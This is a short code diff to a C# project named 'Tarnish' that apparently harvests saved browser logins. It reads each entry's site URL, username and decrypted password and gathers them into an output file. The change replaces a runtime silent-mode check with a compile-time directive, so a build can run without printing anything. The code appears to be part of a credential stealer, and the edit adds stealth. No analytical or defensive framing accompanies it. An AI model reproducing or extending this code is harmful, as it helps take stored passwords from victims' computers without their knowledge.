@@ -28,8 +28,9 @@ namespace Tarnish
                         if (e.username_value != null && e.password_value != null && e.origin_url != null)
                             if (e.username_value.Trim().Length > 0)
                             {
-                                if (!Config.Silent)
-                                    Console.WriteLine(e.origin_url.PadLeft(e.origin_url.Length + 1, ' '));
+                                #if !SILENT
+                                Console.WriteLine(e.origin_url.PadLeft(e.origin_url.Length + 1, ' '));
+                                #endif
                                 FileOut += e.origin_url + Environment.NewLine + "   " + e.username_value + Environment.NewLine + "   " + e.getPassword() + Environment.NewLine;
                             }
                     }
